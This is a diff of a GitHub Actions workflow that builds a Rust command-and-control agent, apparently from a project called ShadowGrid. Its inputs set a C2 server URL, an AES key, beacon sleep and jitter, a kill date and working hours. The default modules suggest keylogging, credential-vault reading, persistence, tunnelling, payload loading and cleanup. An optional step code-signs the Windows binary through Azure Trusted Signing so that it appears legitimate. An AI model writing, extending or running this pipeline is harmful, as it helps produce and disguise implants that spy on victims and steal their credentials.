@@ -1,42 +1,144 @@
-# ShadowGrid Agent Builder — Phase 2
-# This workflow will compile the Rust agent with selected modules
 name: Build Agent
 
 on:
   workflow_dispatch:
     inputs:
       server_url:
-        description: 'C2 Server URL'
+        description: 'C2 server URL'
         required: true
+        type: string
+      aes_key:
+        description: 'AES-256 key (hex)'
+        required: true
+        type: string
+      sleep_seconds:
+        description: 'Beacon sleep interval'
+        required: true
+        default: '5'
+        type: string
+      jitter_percent:
+        description: 'Sleep jitter percentage'
+        required: true
+        default: '20'
+        type: string
+      kill_date:
+        description: 'Kill date (unix timestamp, 0=disabled)'
+        default: '0'
+        type: string
+      work_hours:
+        description: 'Working hours (e.g. 8-18 or empty for always)'
+        default: ''
+        type: string
       target_os:
-        description: 'Target OS (windows/linux/macos)'
+        description: 'Target OS'
         required: true
         default: 'windows'
+        type: choice
+        options:
+          - windows
+          - linux
+          - macos
       target_arch:
-        description: 'Target Architecture (x64/x86/arm64)'
+        description: 'Target architecture'
         required: true
-        default: 'x64'
+        default: 'x86_64'
+        type: choice
+        options:
+          - x86_64
+          - aarch64
+      modules:
+        description: 'Comma-separated module features to enable'
+        required: true
+        default: 'terminal,storage,task_viewer,display,input_monitor,vault_reader,config_store,boot_entries,service_manager,tunnel,package_loader,cleanup,network_scan,clipboard'
+        type: string
       output_format:
-        description: 'Output Format (exe/dll/shellcode)'
+        description: 'Output format'
         required: true
         default: 'exe'
-      modules:
-        description: 'Comma-separated module list'
+        type: choice
+        options:
+          - exe
+          - dll
+      sign_binary:
+        description: 'Sign with Azure Trusted Signing'
+        required: false
+        default: 'false'
+        type: boolean
+      build_id:
+        description: 'Build ID for tracking'
         required: true
-      encryption_key:
-        description: 'AES-256 Key (base64)'
-        required: true
-      sleep:
-        description: 'Sleep seconds'
-        default: '5'
-      jitter:
-        description: 'Jitter percent'
-        default: '20'
+        type: string
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: ${{ inputs.target_os == 'windows' && 'windows-latest' || inputs.target_os == 'macos' && 'macos-latest' || 'ubuntu-latest' }}
     steps:
       - uses: actions/checkout@v4
-      - name: Placeholder
-        run: echo "Agent builder will be implemented in Phase 2"
+
+      - name: Setup Rust
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: |
+            x86_64-pc-windows-msvc
+            x86_64-unknown-linux-gnu
+            aarch64-unknown-linux-gnu
+            x86_64-apple-darwin
+            aarch64-apple-darwin
+
+      - name: Determine target triple
+        id: target
+        shell: bash
+        run: |
+          OS="${{ inputs.target_os }}"
+          ARCH="${{ inputs.target_arch }}"
+          if [ "$OS" = "windows" ]; then
+            echo "triple=${ARCH}-pc-windows-msvc" >> $GITHUB_OUTPUT
+            echo "ext=.exe" >> $GITHUB_OUTPUT
+          elif [ "$OS" = "linux" ]; then
+            echo "triple=${ARCH}-unknown-linux-gnu" >> $GITHUB_OUTPUT
+            echo "ext=" >> $GITHUB_OUTPUT
+          elif [ "$OS" = "macos" ]; then
+            echo "triple=${ARCH}-apple-darwin" >> $GITHUB_OUTPUT
+            echo "ext=" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Build agent
+        working-directory: agent
+        env:
+          SG_SERVER_URL: ${{ inputs.server_url }}
+          SG_AES_KEY: ${{ inputs.aes_key }}
+          SG_SLEEP: ${{ inputs.sleep_seconds }}
+          SG_JITTER: ${{ inputs.jitter_percent }}
+          SG_KILLDATE: ${{ inputs.kill_date }}
+          SG_WORK_HOURS: ${{ inputs.work_hours }}
+        run: |
+          FEATURES="${{ inputs.modules }}"
+          cargo build --release --target ${{ steps.target.outputs.triple }} --no-default-features --features "$FEATURES"
+
+      - name: Rename binary
+        shell: bash
+        run: |
+          SRC="agent/target/${{ steps.target.outputs.triple }}/release/agent${{ steps.target.outputs.ext }}"
+          DST="agent-${{ inputs.build_id }}${{ steps.target.outputs.ext }}"
+          cp "$SRC" "$DST"
+          echo "BINARY=$DST" >> $GITHUB_ENV
+
+      - name: Sign binary (Azure Trusted Signing)
+        if: inputs.sign_binary == true && inputs.target_os == 'windows'
+        uses: azure/trusted-signing-action@v0.5.0
+        with:
+          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          azure-client-secret: ${{ secrets.AZURE_CLIENT_SECRET }}
+          endpoint: ${{ secrets.AZURE_SIGNING_ENDPOINT }}
+          trusted-signing-account-name: ${{ secrets.AZURE_SIGNING_ACCOUNT }}
+          certificate-profile-name: ${{ secrets.AZURE_CERT_PROFILE }}
+          files-folder: .
+          files-folder-filter: exe
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: agent-${{ inputs.build_id }}
+          path: ${{ env.BINARY }}
+          retention-days: 7
